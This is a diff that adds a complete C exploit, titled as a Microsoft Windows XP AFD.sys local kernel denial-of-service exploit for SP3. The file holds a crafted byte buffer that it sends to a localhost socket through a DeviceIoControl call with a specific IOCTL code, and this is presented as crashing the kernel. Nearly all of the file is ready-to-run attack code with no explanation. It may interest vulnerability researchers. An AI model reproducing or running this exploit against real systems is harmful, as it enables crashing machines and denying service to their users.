@@ -1,0 +1,49 @@
+////////////////////////////////////////////////////////////////////////////
+//
+// Title: Microsoft Windows xp AFD.sys Local Kernel DoS Exploit
+// Author: Lufeng Li of Neusoft Corporation
+// Vendor: www.microsoft.com
+// Vulnerable: Windows xp sp3
+//
+/////////////////////////////////////////////////////////////////////////////
+
+#include <stdio.h>
+#include <Winsock2.h>
+
+#pragma comment (lib, "ws2_32.lib")
+
+BYTE buf[]={
+0xac,0xfd,0xd3,0x00,0x01,0x00,0x00,0x00,0x00,0x00,
+0x00,0x00,0x20,0x00,0x00,0x00,0xe8,0xfd,0xd3,0x00,
+0xb8,0xfd,0xd3,0x00,0xf8,0xfd,0xd3,0x00,0xc4,0xfd,
+0xd3,0x00,0xcc,0xfd,0xd3,0x00};
+
+int main( )
+{
+    WSADATA ws;
+
+    SOCKET tcp_socket;
+    struct sockaddr_in peer;
+	ULONG  dwReturnSize;
+
+	printf("\n Microsoft Windows xp AFD.sys Local Kernel DoS Exploit \n\n");
+	printf("\t Create by Lufeng Li of Neusoft Corporation. \n\n");
+
+    WSAStartup(0x0202,&ws);
+
+    peer.sin_family = AF_INET;
+    peer.sin_port = htons( 0x01bd );
+    peer.sin_addr.s_addr = inet_addr( "127.0.0.1" );
+
+    tcp_socket = socket(AF_INET, SOCK_DGRAM, 0);//SOCK_DGRAM
+
+	if ( connect(tcp_socket, (struct sockaddr*) &peer, sizeof(struct sockaddr_in)) )
+    {
+		printf("connect error\n");
+        exit(0);
+    }
+
+	DeviceIoControl( (HANDLE)tcp_socket,0x000120cf, buf,0x24,buf,0x24,&dwReturnSize, NULL);
+	
+    return TRUE;
+}
